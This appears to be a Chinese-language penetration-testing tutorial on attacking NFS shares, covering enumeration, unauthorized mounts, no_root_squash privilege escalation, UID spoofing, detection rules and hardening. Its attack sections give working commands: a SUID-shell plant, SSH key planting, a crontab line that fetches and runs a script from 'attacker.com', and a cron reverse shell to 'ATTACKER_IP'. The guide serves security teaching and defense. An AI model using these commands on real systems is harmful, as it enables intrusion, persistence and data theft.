---
title: "NFS 未授权访问 / Mount 挂载 / Root Squash 绕过 / 提权利用技术"
date: 2026-06-21T22:00:00+08:00
draft: false
weight: 102
description: "NFS 网络文件系统渗透测试：showmount 枚举、未授权挂载、no_root_squash 提权、UID/GID 伪造、SUID 植入、符号链接攻击与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["NFS", "未授权访问", "Mount", "Root Squash", "UID 伪造", "SUID", "提权", "渗透测试"]
---

## 0x00 攻击面总览

NFS（Network File System）是网络文件系统协议，默认配置下存在多个高危风险：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| rpcbind / portmapper | 111 | TCP/UDP | RPC 服务注册、端口映射 |
| nfsd (NFS 服务) | 2049 | TCP/UDP | 文件读写、挂载 |
| rpc.mountd | 动态端口 | TCP/UDP | 挂载请求、导出列表 |
| rpc.statd | 动态端口 | TCP/UDP | 状态监控（历史漏洞） |
| rpc.lockd | 动态端口 | TCP/UDP | 文件锁管理 |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    NFS 攻击面                                   │
│                                                               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    │
│  │ rpcbind      │    │ nfsd         │    │ rpc.mountd   │    │
│  │ :111         │    │ :2049        │    │ 动态端口      │    │
│  │ 端口映射     │    │ 文件读写     │    │ 挂载/导出     │    │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘    │
│         │                   │                    │            │
│  ┌──────┴───────────────────┴────────────────────┴─────────┐ │
│  │              NFS 服务器文件系统                            │ │
│  │                                                          │ │
│  │  攻击路径：                                               │ │
│  │  ① showmount → 导出列表枚举 → 敏感路径发现                │ │
│  │  ② mount → 未授权挂载 → 文件读写                          │ │
│  │  ③ no_root_squash → UID 0 → root 权限提权                │ │
│  │  ④ NFSv3 UID 伪造 → 冒充任意用户                          │ │
│  │  ⑤ SUID 植入 → 本地提权                                   │ │
│  └──────────────────────────────────────────────────────────┘ │
│                                                               │
│  默认风险：                                                    │
│  • NFSv3 无认证机制（信任客户端报告的 UID/GID）                  │
│  • 通配符导出（*）常见误配置                                    │
│  • no_root_squash 允许远程 root 操作                           │
│  • 数据传输默认不加密                                           │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 111,2049 \
  --script=nfs-showmount,nfs-ls,nfs-statfs \
  -oN nfs_scan.txt <target>
```

**典型扫描结果**：

```
PORT     STATE SERVICE     VERSION
111/tcp  open  rpcbind     2-4 (RPC #100000)
2049/tcp open  nfs         3-4 (RPC #100003)
```

### 1.2 showmount 枚举

```bash
# 列出导出列表
showmount -e target

# 响应示例
Export list for target:
/home        *
/shared      10.0.0.0/24
/opt/app     *
/data        192.168.1.0/24

# 列出活跃挂载
showmount -a target

# 响应示例
All mount points on target:
10.0.0.100:/home/user1
10.0.0.101:/shared/docs
```

### 1.3 rpcinfo 枚举

```bash
# 列出所有 RPC 服务
rpcinfo -p target

# 响应示例
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100005    1   udp  20048  mountd
    100005    1   tcp  20048  mountd
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100021    1   udp  37317  nlockmgr
    100021    3   udp  37317  nlockmgr
    100021    4   udp  37317  nlockmgr
    100021    1   tcp  41603  nlockmgr
    100021    3   tcp  41603  nlockmgr
    100021    4   tcp  41603  nlockmgr
```

### 1.4 Shodan / FOFA 搜索语法

```
# Shodan
port:111 rpcbind
port:2049 nfs

# FOFA
port="111" && protocol="rpcbind"
port="2049"
```

---

## 0x02 未授权挂载 — 数据窃取

### 2.1 挂载导出共享

```bash
# 创建挂载点
mkdir -p /mnt/nfs

# 挂载 NFS 共享
mount -t nfs target:/home /mnt/nfs

# 挂载指定版本
mount -t nfs -o vers=3 target:/home /mnt/nfs

# 挂载 NFSv4
mount -t nfs4 target:/ /mnt/nfs
```

### 2.2 数据读取

```bash
# 列出挂载内容
ls -la /mnt/nfs/

# 读取敏感文件
cat /mnt/nfs/.ssh/id_rsa
cat /mnt/nfs/.bash_history
cat /mnt/nfs/.mysql_history

# 搜索敏感数据
grep -r "password" /mnt/nfs/
find /mnt/nfs/ -name "*.key" -o -name "*.pem" -o -name "*.conf"
```

### 2.3 数据写入

```bash
# 写入文件
echo "pwned" > /mnt/nfs/pwned.txt

# 写入 SSH authorized_keys
echo "ssh-rsa AAAA... attacker@host" > /mnt/nfs/.ssh/authorized_keys

# 写入 crontab
echo "* * * * * curl http://attacker.com/shell.sh | bash" > /mnt/nfs/crontab
```

---

## 0x03 no_root_squash — 提权

### 3.1 漏洞原理

`no_root_squash` 选项允许远程 root 用户（UID 0）以 root 身份操作 NFS 共享。

```bash
# 检查导出选项
showmount -e target

# 如果看到 no_root_squash
# /shared *(rw,no_root_squash)
```

### 3.2 SUID Shell 植入

```bash
# 在攻击机上（以 root 身份）
mkdir -p /mnt/nfs
mount -t nfs target:/shared /mnt/nfs

# 复制 bash 并设置 SUID
cp /bin/bash /mnt/nfs/bash
chmod 4755 /mnt/nfs/bash

# 在目标机上执行 SUID bash
/shared/bash -p
# 获得 root shell
```

### 3.3 SSH 密钥植入

```bash
# 在攻击机上（以 root 身份）
mount -t nfs target:/home/root /mnt/nfs

# 植入 SSH 公钥
mkdir -p /mnt/nfs/.ssh
echo "ssh-rsa AAAA... attacker@host" > /mnt/nfs/.ssh/authorized_keys
chmod 600 /mnt/nfs/.ssh/authorized_keys
```

### 3.4 Crontab 植入

```bash
# 在攻击机上（以 root 身份）
mount -t nfs target:/ /mnt/nfs

# 写入 crontab
echo "* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /mnt/nfs/etc/cron.d/backdoor
```

---

## 0x04 NFSv3 UID/GID 伪造

### 4.1 漏洞原理

NFSv3 无认证机制，完全信任客户端报告的 UID/GID。攻击者可以伪造任意用户身份。

### 4.2 UID 伪造攻击

```bash
# 步骤 1：确定目标用户的 UID
# 通过 showmount 或其他方式获取
# 假设目标用户 UID 为 1000

# 步骤 2：在攻击机创建相同 UID 的用户
useradd -u 1000 targetuser

# 步骤 3：切换到该用户
su - targetuser

# 步骤 4：挂载并访问
mount -t nfs target:/home/targetuser /mnt/nfs
ls -la /mnt/nfs/
# 拥有该用户的完整权限
```

### 4.3 批量 UID 枚举

```bash
# 挂载共享后枚举用户
mount -t nfs target:/home /mnt/nfs
ls -la /mnt/nfs/

# 输出示例
drwxr-xr-x 5 1000 1000 4096 Jan  1 00:00 user1
drwxr-xr-x 5 1001 1001 4096 Jan  1 00:00 user2
drwxr-xr-x 5 1002 1002 4096 Jan  1 00:00 user3

# 创建对应用户并访问
for uid in 1000 1001 1002; do
  useradd -u $uid "user$uid" 2>/dev/null
done
```

---

## 0x05 高级利用技术

### 5.1 符号链接攻击

```bash
# 在 NFS 共享中创建符号链接
mount -t nfs target:/shared /mnt/nfs
ln -s /etc/shadow /mnt/nfs/shadow_link

# 如果服务器上的特权进程跟随此符号链接
# 可能暴露 /etc/shadow 内容
```

### 5.2 NFSv4 伪文件系统遍历

```bash
# NFSv4 呈现单一伪文件系统
mount -t nfs4 target:/ /mnt/nfs

# 遍历可能访问未预期导出的目录
ls -la /mnt/nfs/
ls -la /mnt/nfs/home/
ls -la /mnt/nfs/etc/
```

### 5.3 明文流量窃听

```bash
# NFSv3 和 NFSv4（无 Kerberos）传输明文
tcpdump -i eth0 -w nfs_capture.pcap port 2049

# 分析捕获的数据
tshark -r nfs_capture.pcap -Y nfs
```

---

## 0x06 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2007-3673 | 堆溢出 | 10.0 | rpc.statd 堆缓冲区溢出 RCE |
| CVE-2014-0165 | 信息泄露 | 5.0 | rpc.mountd 信息泄露 |
| CVE-2019-9688 | 信息泄露 | 5.3 | NFSv4 信息泄露 |
| CVE-2020-10165 | 权限提升 | 7.8 | NFS ACL 权限提升 |

---

## 0x07 蓝队检测方案

### 7.1 网络层检测

```yaml
title: NFS 外部访问检测
id: nfs-external-access
status: experimental
description: 检测来自非内网段的 NFS 端口访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 111
      - 2049
      - 20048
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

### 7.2 审计日志分析

```bash
# 监控 NFS 挂载操作
grep -E "(mount|nfs)" /var/log/syslog

# 监控 showmount 查询
grep "showmount" /var/log/syslog

# 监控 rpc.mountd 日志
grep "mountd" /var/log/syslog

# 检查 /etc/exports 配置
cat /etc/exports

# 检测 no_root_squash 配置
grep "no_root_squash" /etc/exports

# 检测通配符导出
grep "\*" /etc/exports
```

### 7.3 加固清单

```
[ ] 限制导出范围：不使用 * 通配符，指定具体客户端 IP/子网
[ ] 保持 root_squash 启用（默认）：避免 no_root_squash
[ ] 使用 NFSv4.1+ 配合 Kerberos 认证：sec=krb5:krb5i:krb5p
[ ] 防火墙限制 NFS 端口（111, 2049, mountd）仅允许信任客户端
[ ] 定期审计 /etc/exports 配置
[ ] 监控挂载活动和 showmount 查询
[ ] 禁用不必要的 RPC 服务（statd, lockd）
[ ] 固定 mountd 端口便于防火墙管理
[ ] 使用 NFSv4 ACL 进行细粒度权限控制
[ ] 启用 NFS over TLS（NFSv4.2+）
[ ] 监控 SUID 文件创建
[ ] 监控符号链接创建
[ ] 配置网络分段隔离 NFS 流量
[ ] 启用审计日志并接入 SIEM
```

---

## 0x08 渗透测试检查清单

```
[ ] 端口扫描：111, 2049, 20048
[ ] showmount 导出列表枚举（showmount -e）
[ ] showmount 活跃挂载枚举（showmount -a）
[ ] rpcinfo RPC 服务枚举
[ ] NFS 挂载测试（mount -t nfs）
[ ] 数据读取测试（敏感文件枚举）
[ ] 数据写入测试
[ ] no_root_squash 配置检查
[ ] SUID Shell 植入测试
[ ] SSH 密钥植入测试
[ ] NFSv3 UID 伪造测试
[ ] 符号链接攻击测试
[ ] NFSv4 伪文件系统遍历测试
[ ] 明文流量窃听测试
[ ] /etc/exports 配置审计
[ ] 防火墙规则检查
```

---

## 0x09 小结

NFS 的攻击面以 **未授权挂载** 和 **UID 信任机制** 为核心。NFSv3 无认证机制，完全信任客户端报告的 UID/GID，攻击者可以伪造任意用户身份。`no_root_squash` 误配置允许远程 root 以 root 权限操作共享，通过植入 SUID Shell 或 SSH 密钥实现提权。通配符导出（`*`）是最常见的误配置。蓝队应重点关注：限制导出范围、保持 root_squash 启用、使用 NFSv4+Kerberos、限制网络访问、定期审计 /etc/exports 配置、将审计日志接入 SIEM。
